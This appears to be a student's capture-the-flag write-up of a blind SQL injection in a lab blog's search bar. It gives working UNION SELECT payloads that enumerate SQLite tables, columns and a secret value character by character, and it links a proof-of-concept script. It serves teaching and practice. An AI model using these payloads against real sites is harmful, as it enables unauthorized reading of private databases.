# Challenge `Sometimes we are just temporarily blind` writeup

- Vulnerability: What type of vulnerability is being exploited
  - SQL injection
- Where: Where is the vulnerability present
  - `http://ssof2526.challenges.cwte.me:25262` in the search bar.
- Impact: What results of exploiting this vulnerability
  - Allows any user to access information in the database.
- NOTE: Eventhough the blog posts are no longer visible in the main page, information about the number of results found with the query is still displayed. We can take advantage of this to perform blind SQL injection attacks.

## Steps to reproduce

1. In the search bar enter the following payload: `'UNION SELECT null, substr(name, 1, {len(guess)}) as n, null FROM sqlite_master WHERE type = 'table' and n ='{guess}';--`, where `guess` is the current guess for the table name and `len(guess)` is the length of the guess. With this we are trying to guess the table names one character at a time. Since the baseline number of results is 4, if the number of results returned is greater than 4, then we correctly guessed the current character. Next, we add `guess` to the queue to try and find the next character. Repeat this process until the queue is empty, which means we have found all the table names.
2. With this method we can find the table names in the database. In this case, we find three tables: `'user'`, `'blog_post'` and `'super_s_sof_secrets'`.
3. Once we have the table names, we can repeat the same process in 1, but using the following query: `UNION SELECT null, substr(name, 1, {len(guess)}) as n, null FROM pragma_table_info('{table_name}') WHERE n = '{guess}';--`, where `table_name` is the name of the table we want to get the column names from (in this case `'super_s_sof_secrets'`). With this we can find the column names.
4. Using this method we find the column names: `'id'` and `'secret'`.
5. Finally, we can repeat the same process in 1, but using the following query: `UNION SELECT null, substr({column_name}, 1, {len(guess)}) as n, null FROM {table_name} WHERE n = '{guess}';--`, where `column_name` is the name of the column we want to get the data from (in this case `'secret'`) and `table_name` is the name of the table (in this case `'super_s_sof_secrets'`). With this we can find the data in the column and consequently the flag.

**Note:** If you try to search the following: `'a`, you will be redirected to an error page where you can see the SQL query used in the search funtion. The query is the following: `SELECT id, title, content FROM blog_post WHERE title LIKE '%<search_content>%' OR content LIKE '%<search_content>%'`. If you replace `<search_content>` with `' UNION SELECT null, substr(name, 1, {len(guess)}) as n, null FROM sqlite_master WHERE type = 'table' and n ='{guess}';--` the performed query will be: `SELECT id, title, content FROM blog_post WHERE title LIKE '%' UNION SELECT null, substr(name, 1, {len(guess)}) as n, null FROM sqlite_master WHERE type = 'table' and n ='{guess}';--` since `--` comments the rest of the query. This will return the number of posts in the `'blog_post'` table and the name of the tables that start with `guess`. 

If you replace `<search_content>` with `' UNION SELECT null, substr(name, 1, {len(guess)}) as n, null FROM pragma_table_info('{table_name}') WHERE n = '{guess}';--` where `table_name` is `'super_s_sof_secrets'`, the performed query will be: `SELECT id, title, content FROM blog_post WHERE title LIKE '%' UNION SELECT null, substr(name, 1, {len(guess)}) as n, null FROM pragma_table_info('{table_name}') WHERE n = '{guess}';--` since `--` comments the rest of the query. This will return the number of posts in the `'blog_post'` table plus the name of the columns that start with `guess`.

If you replace `<search_content>` with `' UNION SELECT null, substr({column_name}, 1, {len(guess)}) as n, null FROM {table_name} WHERE n = '{guess}';--` where `table_name` is `'super_s_sof_secrets'` and `column_name` is `'secret'`, the performed query will be: `SELECT id, title, content FROM blog_post WHERE title LIKE '%' UNION SELECT null, substr({column_name}, 1, {len(guess)}) as n, null FROM {table_name} WHERE n = '{guess}';--` since `--` comments the rest of the query. This will return the number of posts in the `'blog_post'` table plus the entries in the `'secret'` column in the `'super_s_sof_secrets'` table that start with `guess`.

[(POC)](sometimes_we_are_just_temporarily_blind_poc.py)
